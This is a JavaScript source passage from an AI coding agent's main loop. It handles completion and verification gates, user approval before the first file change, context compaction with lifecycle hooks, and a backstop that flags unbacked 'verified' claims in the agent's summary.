            const synth = await synthesizeFromGathered({ creds, conversation, cleanMessage, onChunk, abortSignal });
            // The user still gets the salvaged answer; the run still records
            // that it was salvaged rather than completed.
            if (synth) { finalAnswer = synth; providerError.salvaged = true; break; }
          } catch (e) {
            console.warn("[AgentLoop] synthesis fallback failed:", String(e?.message || e).slice(0, 120));
          }
        }
        // Recorded, not just rendered into prose. An evaluator has to be able
        // to tell "the agent did the task badly" from "the provider never
        // answered" — scoring a 403 out-of-quota as a task failure is how a
        // benchmark suite quietly reports nonsense. See runMetrics below.
        providerError = { message: errStr.slice(0, 300), attempts: consecutiveErrors };
        finalAnswer = `The AI provider failed after ${consecutiveErrors} attempt(s): ${errStr.slice(0, 200)}. Please try again.`;
        break;
      } finally {
        // Runs on every exit path out of the try/catch above (including the
        // `continue`/`break` retry branches) — the heartbeat must stop the
        // moment the call actually resolves, one way or another.
        clearInterval(heartbeat);
      }
      consecutiveErrors = 0;

      // Repair malformed tool calls (empty name / unknown tool / bad args) so
      // the weak model's junk doesn't corrupt the conversation and 400 the next
      // request. If the whole response was junk (no valid tools, no text), nudge
      // the model to answer in plain text instead of looping on nothing.
      sanitizeToolCalls(message, validToolNames);
      if (!message.tool_calls?.length && !String(message.content || "").trim()) {
        conversation.push({ role: "assistant", content: "(no output)" });
        conversation.push({ role: "user", content: "That produced no usable output. Answer now in plain text with what you have — no tool calls." });
        continue;
      }

      conversation.push(message);
      ctx.recordEvent?.({
        kind: "assistant",
        content: String(message.content || ""),
        toolCalls: message.tool_calls?.length ? message.tool_calls : null,
      });

      // Plain text response = the agent believes it is done. The controller
      // decides whether it actually is. Two gates, in order:
      //
      //   1. Execution intent — the user asked for a change and nothing in the
      //      workspace moved. Describing the implementation, however well, is
      //      not performing it. Back to execution.
      //   2. Verification — files changed but nothing was checked.
      //
      // Both are bounded inside the controller, so neither can trap a run: a
      // question finishes immediately, and a model that simply will not call a
      // tool ends with an honest report rather than an infinite loop.
      if (!message.tool_calls?.length) {
        const text = String(message.content || "").trim();
        const gate = ctx.taskController.canFinish({
          editedPaths: ctx.editedFiles.keys(),
          responseText: text,
          // Read from disk, not from what the model said it wrote. Only
          // computed for resume tasks — see the leftover-marker gate in
          // taskController for why the check is scoped that narrowly.
          unresolvedMarkers: ctx.taskController.shape === "resume"
            ? await findUnresolvedMarkers(ctx.runtime, [...ctx.editedFiles.keys()])
            : [],
        });
        if (!gate.allowed) {
          // Each refusal is a different thing the user should see happening —
          // "verifying" while the agent is actually being told to go and build
          // the other half of the feature is just confusing. Keyed on the
          // gate's own `kind` so the wording cannot drift out of sync with it.
          const REFUSAL = {
            no_mutation:        { stage: "executing", message: "✋ You described the change — now apply it to the real files..." },
            open_plan_items:    { stage: "executing", message: "📋 Not done yet — finishing the remaining steps..." },
            incomplete_shape:   { stage: "executing", message: "🧩 Not done yet — the request asked for more than this..." },
            unresolved_markers: { stage: "executing", message: "📌 Not done yet — the TODOs marking the unfinished work are still there..." },
            unverified:         { stage: "verifying", message: "🔍 Not done yet — verifying the changes first..." },
            verification_failed:{ stage: "verifying", message: "🔍 Verification is still failing — fixing it first..." },
          }[gate.kind] ?? { stage: "verifying", message: "🔍 Not done yet — verifying the changes first..." };
          emit?.({ type: "progress", ...REFUSAL });
          conversation.push({ role: "user", content: gate.directive });
          continue;
        }
        // The agent was asked to change something and never did, even after
        // being sent back. Say so plainly rather than presenting the
        // explanation as if it were the delivered work.
        if (gate.unfulfilled) {
          const note = "\n\n⚠️ **No files were changed.** You asked for an implementation, but the agent only described it — nothing above has been applied to your project.";
          finalAnswer = text + note;
          emit?.({ type: "content", content: note });
          break;
        }
        // Verified, but the agent's own plan still has open items. Say which,
        // rather than letting a green checkmark imply the feature is whole.
        if (gate.incomplete) {
          const note = `\n\n⚠️ **Some planned steps were left undone:**\n${gate.openItems.map((t) => `- ☐ ${t}`).join("\n")}`;
          finalAnswer = text + note;
          emit?.({ type: "content", content: note });
          break;
        }
        // Or the request itself is still not satisfied — checked against what
        // actually changed on disk, so this fires even when the agent kept no
        // plan at all to be honest about.
        if (gate.unmet?.length) {
          const note = `\n\n⚠️ **This may not be complete:**\n${gate.unmet.map((u) => `- ${u}`).join("\n")}`;
          finalAnswer = text + note;
          emit?.({ type: "content", content: note });
          break;
        }
        finalAnswer = text;
        break;
      }

      // Ask-mode gate: pause before the FIRST real mutation for user approval.
      if (approvalState && !approvalState.granted) {
        const firstMutation = message.tool_calls.find((tc) => {
          if (!MUTATING_TOOLS.has(tc.function.name)) return false;
          if (tc.function.name === "bash") {
            try { return !BASH_READONLY_RE.test(JSON.parse(tc.function.arguments || "{}").command || ""); }
            catch { return true; }
          }
          return true;
        });
        if (firstMutation && approvalState.promise) {
          const steps = message.tool_calls
            .filter((tc) => MUTATING_TOOLS.has(tc.function.name))
            .map((tc) => {
              let a = {};
              try { a = JSON.parse(tc.function.arguments || "{}"); } catch {}
              return {
                action: tc.function.name === "write_file" ? "create" : "edit",
                path: a.path || a.command?.slice(0, 60) || "(command)",
                description: tc.function.name === "bash" ? `run: ${a.command?.slice(0, 120)}` : `${tc.function.name} on ${a.path}`,
              };
            });
          emit?.({ type: "plan_preview", steps });
          emit?.({ type: "progress", stage: "planning", message: "⏸ Waiting for your approval to start making changes..." });
          try {
            await approvalState.promise;
            approvalState.granted = true;
            emit?.({ type: "progress", stage: "executing", message: "✅ Approved — applying changes..." });
          } catch {
            return { finalAnswer: "Cancelled — no changes were made.", cancelled: true, iterations: iteration };
          }
        }
      }

      // ask_user must run alone — if the model batched it with other calls,
      // answer only the question this iteration and tell the model to redo
      // the rest next turn once it has the answer (never fire tool calls
      // blindly alongside a pending clarification).
      const askUserCall = message.tool_calls.find((tc) => tc.function.name === "ask_user");
      const toolCallsThisTurn = askUserCall && message.tool_calls.length > 1 ? [askUserCall] : message.tool_calls;
      const deferredCalls = askUserCall && message.tool_calls.length > 1
        ? message.tool_calls.filter((tc) => tc !== askUserCall)
        : [];

      // Side-effect-free calls the model batched into this turn (e.g. reading
      // several related files before editing them) run CONCURRENTLY — the
      // same "independent tool calls run in parallel" principle Claude Code
      // itself follows. Mutating calls run strictly sequentially and in
      // order. See executeToolCallsBatch for the full contract.
      const toolResults = await executeToolCallsBatch(toolCallsThisTurn, ctx, iteration, iterationBudget, abortSignal);
      for (const deferred of deferredCalls) {
        toolResults.push({
          role: "tool",
          tool_call_id: deferred.id,
          content: JSON.stringify({ success: false, error: "Not run — you asked a question in the same turn. Wait for the answer, then re-issue this call on its own." }),
        });
      }
      conversation.push(...toolResults);

      // Repetition detection: the same fix re-applied to the same file while
      // the identical failure keeps coming back. Left alone, the model burns
      // the whole budget nudging one type annotation back and forth. Force it
      // to re-plan, and escalate to a structurally different approach if it
      // gets stuck again on the same path.
      const thrash = ctx.taskController.detectThrash();
      if (thrash) {
        ctx.taskController.escalateStrategy();
        emit?.({ type: "progress", stage: "planning", message: "🔄 That fix isn't working — re-planning..." });
        conversation.push({ role: "user", content: ctx.taskController.strategyDirective(thrash) });
      }

      // Termination policy. Close the turn with the controller and let it
      // decide whether this task is still worth continuing. Without this, a
      // task that is stuck keeps calling the model until MAX_ITERATIONS —
      // burning a whole quota to arrive at the same wall it hit on step 4.
      // Stopping here is the difference between an honest blocker report and
      // an expensive one.
      const verdict = ctx.taskController.endIteration();
      if (verdict.stop) {
        console.log(`[AgentLoop] stopping early after ${verdict.iterations} step(s): ${verdict.reason} — ${verdict.detail}`);
        emit?.({ type: "progress", stage: "stopped", message: `⛔ Stopping early: ${verdict.reason.replace(/_/g, " ")}` });
        finalAnswer = ctx.taskController.blockerReport();
        emit?.({ type: "content", content: finalAnswer });
        stoppedEarly = true;
        break;
      }
      // Not a stop — the controller wants to steer (e.g. the discovery budget
      // is spent and it is time to commit to a plan and start editing).
      if (verdict.directive) {
        const NUDGE = {
          recovery:         { stage: "executing", message: "🔁 That keeps failing — trying a different approach..." },
          discovery_grace:  { stage: "planning",  message: "📋 Going in circles — committing to a plan..." },
          discovery_budget: { stage: "planning",  message: "📋 Enough exploring — time to implement..." },
          // Without this the default below would announce "time to implement"
          // at the exact moment the work is finished and being checked.
          verification_grace: { stage: "verifying", message: "🔍 Edits made but nothing checked — verifying..." },
        }[verdict.directiveKind] ?? { stage: "planning", message: "📋 Enough exploring — time to implement..." };
        emit?.({ type: "progress", ...NUDGE });
        conversation.push({ role: "user", content: verdict.directive });
      }

      // PostToolBatch: fires once after a parallel batch settles, so a hook can
      // react to the group (re-lint everything touched, emit one notification)
      // rather than once per call.
      if (toolCallsThisTurn.length > 1) {
        await ctx.fireHook?.("PostToolBatch", {
          tools: toolCallsThisTurn.map((tc) => tc.function.name),
          count: toolCallsThisTurn.length,
          iteration,
        });
      }

      // Self-pacing nudge: a build/change request that has burned most of its
      // budget on research (grep/read/web_search/fetch_url) without editing a
      // single file usually means the model is over-researching instead of
      // using the tools built for exactly this — spawn_agent to offload heavy
      // exploration, or ask_user to stop guessing — and is heading for an
      // "iteration budget reached, nothing was built" dead end. One reminder,
      // fired once, pointed at its own escape hatches.
      if (nudgeOnStall && !stallNudged && ctx.editedFiles.size === 0
          && iteration >= Math.floor(iterationBudget * 0.6) && looksBuildRequest(cleanMessage)) {
        stallNudged = true;
        conversation.push({
          role: "user",
          content: `[${iteration}/${iterationBudget} steps used, no files changed yet.] If you're still gathering context, stop researching directly and either: delegate remaining open-ended exploration to spawn_agent so it doesn't cost you more turns, or call ask_user if something is genuinely ambiguous. Otherwise you likely already have enough to start editing — make the actual changes now instead of continuing to look things up.`,
        });
      }

      // Size guard: several fetches/reads can blow past the model's input limit.
      // Shrink old tool outputs to keep the whole conversation under budget.
      shrinkOldToolOutputs(conversation, CONV_CHAR_BUDGET);

      // Context window management: keep the pinned prefix (carried-over history
      // + this turn's task); evict old middle turns, shrinking evicted tool
      // outputs instead of silently losing shape. The tail is clamped so it can
      // never overlap the prefix and duplicate messages when history is present.
      if (conversation.length > MAX_CONV_MSGS) {
        const head = conversation.slice(0, pinnedPrefix);
        const tailCount = Math.min(MAX_CONV_MSGS - 8, Math.max(0, conversation.length - pinnedPrefix));
        const keepTail = tailCount ? conversation.slice(-tailCount) : [];
        const evicted = conversation.slice(pinnedPrefix, conversation.length - tailCount);
        if (evicted.length) {
          const beforeMessages = conversation.length;
          const beforeChars = conversationChars(conversation);

          // PreCompact — fires immediately before the real compaction, once per
          // compaction. A blocking hook ABORTS this pass: the conversation is
          // left exactly as-is (nothing is evicted), and the next iteration will
          // try again. Wrapped so a broken hook can never leave the conversation
          // half-compacted.
          let blocked = false;
          try {
            const pre = await ctx.fireHook?.("PreCompact", {
              session_id: sessionId,
              trigger: "auto",
              reason: `conversation reached ${beforeMessages} messages (limit ${MAX_CONV_MSGS})`,
              task: cleanMessage.slice(0, 300),
              messageCount: beforeMessages,
              charCount: beforeChars,
              evictingCount: evicted.length,
              pinnedCount: pinnedPrefix,
              filesRead: [...ctx.readFiles],
            });
            blocked = pre?.decision === "block";
            if (blocked) {
              console.warn(`[Hooks] PreCompact blocked compaction: ${pre.reason || "(no reason)"}`);
            }
          } catch (err) {
            // A thrown hook must not abort the agent turn.
            console.warn(`[Hooks] PreCompact failed, compacting anyway: ${err.message}`);
          }

          if (!blocked) {
            const digest = evicted
              .map((m) => {
                if (m.role === "assistant" && m.tool_calls?.length) return m.tool_calls.map((tc) => `→ ${tc.function.name}`).join(", ");
                if (m.role === "tool") return null;
                return String(m.content || "").slice(0, 120);
              })
              .filter(Boolean)
              .join(" | ");
            const summary = `[Earlier turns compacted: ${digest.slice(0, 1000)}]\nFiles already read this session: ${[...ctx.readFiles].join(", ") || "(none)"}`;
            conversation.splice(0, conversation.length, ...head, { role: "user", content: summary }, ...keepTail);

            // Compaction can sever an assistant tool_call from its result, which
            // is a hard provider error. Repair before anyone observes the
            // conversation — including the PostCompact hook.
            const repaired = repairToolPairing(conversation);
            if (repaired.length !== conversation.length) conversation.splice(0, conversation.length, ...repaired);

            // PostCompact — only after a compaction that actually happened.
            // Observational: it cannot alter the result.
            try {
              await ctx.fireHook?.("PostCompact", {
                session_id: sessionId,
                trigger: "auto",
                reason: `compacted at ${beforeMessages} messages`,
                summary,
                messagesBefore: beforeMessages,
                messagesAfter: conversation.length,
                charsBefore: beforeChars,
                charsAfter: conversationChars(conversation),
                evictedCount: evicted.length,
              });
            } catch (err) {
              console.warn(`[Hooks] PostCompact failed: ${err.message}`);
            }
          }
        }
      }
    }

    return { finalAnswer, iterations: iteration, stoppedEarly };
  }

  const approvalState = { granted: permissionMode !== "ask", promise: approvalPromise };
  const mainResult = await runToolLoop({ iterationBudget: MAX_ITERATIONS, approvalState, nudgeOnStall: true });
  let finalAnswer = mainResult.finalAnswer;

  if (mainResult.cancelled) {
    emit?.({ type: "content", content: finalAnswer });
    closeMcpClients(ctx);
    return { finalAnswer, editedFiles: [], usage, messages: [new AIMessage(finalAnswer)] };
  }

  // Iteration budget exhausted with no final text — ask for a summary without tools.
  if (!finalAnswer) {
    let streamedAny = false;
    try {
      const { message } = await chatWithTools({
        creds,
        system: systemPrompt,
        messages: [...conversation, { role: "user", content: "Iteration budget reached. Summarize what you accomplished, what remains, and how to continue. Plain text only." }],
        tools: [],
        maxTokens: 1200,
        temperature: 0,
        signal: abortSignal || undefined,
        onChunk: (chunk) => { streamedAny = true; emit?.({ type: "content", content: chunk }); },
        thinking: false,
      });
      finalAnswer = String(message.content || "").trim();
    } catch { /* fall through to the static message below */ }
    if (!finalAnswer) {
      finalAnswer = "Work stopped at the iteration limit before a summary could be produced.";
      if (!streamedAny) emit?.({ type: "content", content: finalAnswer });
    }
  }

  // Stop-hook verification (Claude Code-style): if THIS project declared a
  // `stop` command in .kodo/settings.json, run it and block completion until it
  // passes (bounded retries — see runStopHook above for why this doesn't try
  // to guess the toolchain itself). A single fix-up pass often isn't enough
  // for subtler failures, so retrying with the *current* remaining output fed
  // back each round is what stops real build breaks from reaching the user.
  // No hook configured → nothing runs here and no claim is made; verification
  // is whatever the model itself already did per the VERIFY step.
  const MAX_FIX_ATTEMPTS = 3;
  let stopHookPassed = false;
  let stopHookRan = false;
  if (!abortSignal?.aborted && ctx.editedFiles.size > 0) {
    let result = await runStopHook(ctx.runtime, hooks, emit);
    let attempt = 0;

    // The hook still RUNS after an early stop — the user deserves to know the
    // real state of their tree. But the fix-up loop is skipped: the controller
    // just concluded this task is stuck, and spending another 3×8 turns on it
    // is exactly the quota burn the early stop exists to prevent.
    while (result.ran && !result.passed && attempt < MAX_FIX_ATTEMPTS
           && !mainResult.stoppedEarly && !abortSignal?.aborted) {
      attempt++;
      emit?.({ type: "progress", stage: "executing", message: `⚠️ Verification failed — fixing (attempt ${attempt}/${MAX_FIX_ATTEMPTS})...` });
      conversation.push({
        role: "user",
        content: `The configured verify command (\`${hooks.stop}\`) is FAILING because of your changes. Fix EVERY issue below. Read the offending files if needed, make the edits, and do NOT claim you're done until it genuinely passes. When fixed, reply with a short summary.\n\n${result.output.slice(0, 6000)}`,
      });
      await runToolLoop({ iterationBudget: 8, approvalState: null });
      // The fix pass streamed its own narration live; re-check the real state.
      result = await runStopHook(ctx.runtime, hooks, null);
    }

    const note = !result.ran
      ? ""
      : result.passed
        ? `\n\n✅ Verified — \`${hooks.stop}\` passed.`
        : `\n\n⚠️ **Verification is still failing** after ${attempt} fix attempt(s) (\`${hooks.stop}\`). Review before using:\n${result.output.slice(0, 800)}`;
    finalAnswer += note;
    if (note) emit?.({ type: "content", content: note });
    stopHookPassed = result.ran && result.passed;
    stopHookRan = result.ran;
    // The project's own declared check is verification too — tell the
    // controller, so its final state reflects what actually happened.
    if (result.ran) {
      ctx.taskController.recordVerification({ command: hooks.stop, passed: result.passed, output: result.output });
    }
  }

  // Anti-fabrication backstop: the stop-hook note above is the only
  // CODE-appended "verified" claim, and it's already gated on a real passing
  // command. But the model's own FINISH-step prose can still assert
  // "verified" / "tests pass" as habitual boilerplate even when it never ran
  // a check this turn — that's the false-confidence pattern users actually
  // hit. Catch it here: if the free text claims verification but nothing
  // real backs it (no passing stop hook, no test/lint/build/curl-shaped bash
  // command actually run this turn), correct it rather than let it stand.
  if (hasUnhedgedVerificationClaim(finalAnswer) && !stopHookPassed) {
    // "Was a check RUN" is the wrong question — it was the old one, and it let
    // through the two claims that matter most: a check that ran and FAILED,
    // and a check that passed before further edits. The controller tracks both
    // precisely, so ask it. (Sub-agent runs have no controller; fall back.)
    const snap = ctx.taskController?.snapshot();
    const backed = snap
      ? snap.verificationCurrent
      : ctx.bashCommands.some((cmd) => VERIFY_COMMAND_RE.test(cmd));
    if (!backed) {
      const correction = snap?.verificationStale
        ? "\n\n⚠️ Correction: the summary above claims verification, but files changed after the last passing check — that result no longer describes the current state. Treat it as unverified."
        : "\n\n⚠️ Correction: the summary above claims verification, but no test/lint/build/typecheck command actually ran and passed this turn — treat it as unverified.";
      finalAnswer += correction;
      emit?.({ type: "content", content: correction });
    }
  }

  // ── Stop / StopFailure ─────────────────────────────────────────────────────
  // The agent's real stopping lifecycle, fired exactly once per run on every
  // termination path. Distinct from (and additive to) the legacy `hooks.stop`
  // verify command above, which stays backward compatible: that one is a
  // project's verify gate, this one is the lifecycle event.
  //
  // StopFailure is NOT "the task failed" — it fires when stopping itself is
  // unclean: verification still failing, the iteration budget exhausted with no
  // answer, or an aborted run.
  // `exitReason` is hoisted out of this block because it is also the single
  // most useful thing an outside observer (the benchmark runner) can know
  // about how a run ended — see the runMetrics return below.
  let exitReason;
  {
    const budgetExhausted = mainResult.iterations >= MAX_ITERATIONS && !mainResult.finalAnswer;
    const verifyFailing = ctx.editedFiles.size > 0 && stopHookRan && !stopHookPassed;
    const cancelled = !!abortSignal?.aborted;
    const stopReason = cancelled ? "cancelled"
      : verifyFailing ? "verification_failing"
        : budgetExhausted ? "iteration_budget_exhausted"
          : "completed";
    exitReason = stopReason;
    const unclean = stopReason !== "completed";

    const stopPayload = {
      session_id: sessionId, request_id: requestId,
      reason: stopReason,
      iterations: mainResult.iterations,
      editedFiles: [...ctx.editedFiles.keys()],
      answerChars: String(finalAnswer || "").length,
      durationMs: Date.now() - runStartedAt,
    };
    try {
      await ctx.fireHook?.("Stop", stopPayload);
      if (unclean) await ctx.fireHook?.("StopFailure", stopPayload);
    } catch (err) {
      // The run is already over; a failing stop hook must not change its result.
      console.warn(`[Hooks] Stop lifecycle failed: ${err.message}`);
    }
  }

  const editedFiles = [...ctx.editedFiles.keys()];
  emit?.({ type: "usage", ...usage, model: creds.model });
  const totalMs = Date.now() - runStartedAt;
  const avgMsPerCall = usage.llmCalls > 0 ? Math.round(totalMs / usage.llmCalls) : 0;
  console.log(`[AgentLoop] Done: ${editedFiles.length} file(s) edited, ${usage.inputTokens}+${usage.outputTokens} tokens, ${usage.llmCalls} LLM call(s), ${totalMs}ms total (~${avgMsPerCall}ms/call avg), model=${creds.model}`);
  closeMcpClients(ctx);

  return {
    finalAnswer,
    editedFiles,
    usage,
    // Observability only — nothing in the graph reads this back, and no
    // behaviour branches on it. It exists so an evaluator (bench/) can score a
    // run from what actually happened instead of re-deriving it from prose:
    // how the run terminated, how many turns it took, and the controller's own
    // verification/stop bookkeeping. See bench/scoring.mjs.
    runMetrics: {
      exitReason,
      iterations: mainResult.iterations,
      stoppedEarly: !!mainResult.stoppedEarly,
      durationMs: totalMs,
      model: creds.model,
      stopHookRan,
      stopHookPassed,
      // null unless the provider itself failed — see the assignment above.
      providerError,
      controller: ctx.taskController?.snapshot?.() ?? null,
    },
    messages: [new AIMessage(finalAnswer)],
  };
}
